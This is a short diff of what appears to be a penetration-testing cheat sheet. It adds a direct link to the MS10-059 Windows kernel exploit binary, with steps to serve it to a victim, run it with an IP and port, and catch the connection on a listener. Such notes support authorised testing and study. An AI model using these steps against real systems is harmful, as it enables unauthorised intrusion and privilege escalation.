@@ -79,8 +79,8 @@ git clone https://github.com/worawit/MS17-010.git
 ### Windows
 #### MS10-059
 
-* use the https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
-* serve the MS10-059.exe to victim
+* use the https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059 
+* serve the MS10-059.exe (https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe) to victim
 * run exploit: 
   ##### MS10-059.exe \<ip> \<port>
 * Need Listener
